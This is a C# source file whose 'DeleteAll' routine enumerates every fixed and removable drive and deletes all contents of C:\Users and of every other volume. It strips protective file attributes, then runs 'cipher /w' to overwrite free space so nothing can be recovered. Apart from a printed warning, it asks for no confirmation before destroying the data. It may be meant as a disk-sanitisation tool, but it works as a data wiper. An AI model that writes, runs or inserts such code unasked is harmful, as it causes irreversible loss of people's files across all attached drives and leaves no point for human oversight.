using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

class DeleteAll
{
    public static void Run()
    {
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("THIS IS IRREVERSIBLE.");

        // ---- 1. Detect every volume exactly once, in order ----
        var volumes = new List<(string VolumeRoot, string TargetPath)>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        foreach (var drive in DriveInfo.GetDrives())
        {
            try
            {
                if (!drive.IsReady) continue;
                if (drive.DriveType != DriveType.Fixed &&
                    drive.DriveType != DriveType.Removable) continue;

                string root = drive.RootDirectory.FullName;   // "C:\"  "D:\"  ...
                if (string.IsNullOrEmpty(root)) continue;
                if (!seen.Add(root)) continue;                // already queued

                string target = root.Equals(@"C:\", StringComparison.OrdinalIgnoreCase)
                    ? @"C:\Users"
                    : root;

                volumes.Add((root, target));
            }
            catch
            {
                // Empty card readers / locked volumes — skip silently.
            }
        }

        if (volumes.Count == 0)
        {
            Console.WriteLine("No volumes detected. Nothing to do.");
            return;
        }

        Console.WriteLine($"\nDetected {volumes.Count} volume(s) — will process one by one:");
        foreach (var v in volumes)
            Console.WriteLine($"  Volume {v.VolumeRoot}  ->  delete contents of  {v.TargetPath}");

        // ---- 2. Process each volume sequentially: delete then cipher ----
        foreach (var v in volumes)
        {
            Console.WriteLine($"\n===== Volume {v.VolumeRoot} =====");

            if (!Directory.Exists(v.TargetPath))
            {
                Console.WriteLine($"  Target not found: {v.TargetPath} (skipping delete)");
            }
            else
            {
                Console.WriteLine($"  Deleting contents of: {v.TargetPath}");
                DeleteContentsFast(v.TargetPath);
            }

            Console.WriteLine($"  Running cipher /w on {v.VolumeRoot} (this can take a long time)...");
            RunCipher(v.VolumeRoot);
        }

        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine("\nAll operations complete.");
        Console.ResetColor();
        Console.WriteLine("Press any key to exit.");
        Console.ReadKey();
    }

    /// <summary>
    /// Deletes all files and sub-directories inside 'rootPath' but never 'rootPath' itself.
    /// Uses an explicit stack (no recursion) and per-item try/catch so one locked file
    /// does not abort the whole operation.
    /// </summary>
    static void DeleteContentsFast(string rootPath)
    {
        // Clear read-only on the root itself so enumeration doesn't trip on it.
        try
        {
            var di = new DirectoryInfo(rootPath);
            if ((di.Attributes & FileAttributes.ReadOnly) != 0)
                di.Attributes &= ~FileAttributes.ReadOnly;
        }
        catch { /* best-effort */ }

        var stack = new Stack<string>();
        var dirsToDelete = new List<string>();
        stack.Push(rootPath);

        while (stack.Count > 0)
        {
            string current = stack.Pop();
            dirsToDelete.Add(current);

            // --- files in this directory ---
            string[] files;
            try { files = Directory.GetFiles(current); }
            catch (Exception ex)
            {
                Console.WriteLine($"  [ENUM FILES ERR] {current}: {ex.Message}");
                files = Array.Empty<string>();
            }
            foreach (var f in files) TryDeleteFile(f);

            // --- sub-directories ---
            string[] subs;
            try { subs = Directory.GetDirectories(current); }
            catch (Exception ex)
            {
                Console.WriteLine($"  [ENUM DIRS ERR] {current}: {ex.Message}");
                subs = Array.Empty<string>();
            }
            foreach (var d in subs) stack.Push(d);
        }

        // Delete directories deepest-first, skipping the root itself.
        for (int i = dirsToDelete.Count - 1; i >= 0; i--)
        {
            string d = dirsToDelete[i];
            if (string.Equals(d, rootPath, StringComparison.OrdinalIgnoreCase)) continue;

            try
            {
                var di = new DirectoryInfo(d);
                var attrs = di.Attributes;
                if ((attrs & FileAttributes.ReadOnly) != 0) attrs &= ~FileAttributes.ReadOnly;
                if ((attrs & FileAttributes.Hidden)   != 0) attrs &= ~FileAttributes.Hidden;
                if ((attrs & FileAttributes.System)   != 0) attrs &= ~FileAttributes.System;
                if (attrs != di.Attributes) di.Attributes = attrs;

                Directory.Delete(d, false);
            }
            catch (UnauthorizedAccessException)
            {
                Console.WriteLine($"  [ACCESS DENIED DIR] {d}");
            }
            catch (IOException ex)
            {
                Console.WriteLine($"  [IO ERR DIR] {d}: {ex.Message}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"  [ERR DIR] {d}: {ex.Message}");
            }
        }
    }

    static void TryDeleteFile(string path)
    {
        try
        {
            var fi = new FileInfo(path);
            if (!fi.Exists) return;

            var attrs = fi.Attributes;
            if ((attrs & FileAttributes.ReadOnly) != 0) attrs &= ~FileAttributes.ReadOnly;
            if ((attrs & FileAttributes.Hidden)   != 0) attrs &= ~FileAttributes.Hidden;
            if ((attrs & FileAttributes.System)   != 0) attrs &= ~FileAttributes.System;
            if (attrs != fi.Attributes) fi.Attributes = attrs;

            File.Delete(path);
        }
        catch (UnauthorizedAccessException)
        {
            Console.WriteLine($"  [ACCESS DENIED FILE] {path}");
        }
        catch (IOException ex)
        {
            Console.WriteLine($"  [IO ERR FILE] {path}: {ex.Message}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"  [ERR FILE] {path}: {ex.Message}");
        }
    }

    /// <summary>
    /// cipher /w:&lt;dir&gt; wipes the free space of the whole volume containing &lt;dir&gt;.
    /// Passing the volume root means the entire volume is covered.
    /// </summary>
    static void RunCipher(string volumeRoot)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "cipher.exe",
                Arguments = $"/w:{volumeRoot}",
                UseShellExecute = false,
                CreateNoWindow = false,
                RedirectStandardOutput = false,
                RedirectStandardError = false
            };

            using var p = Process.Start(psi);
            if (p == null)
            {
                Console.WriteLine("  Failed to start cipher.exe");
                return;
            }
            p.WaitForExit();
            Console.WriteLine($"  cipher exit code: {p.ExitCode}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"  [CIPHER ERR] {ex.Message}");
        }
    }
}
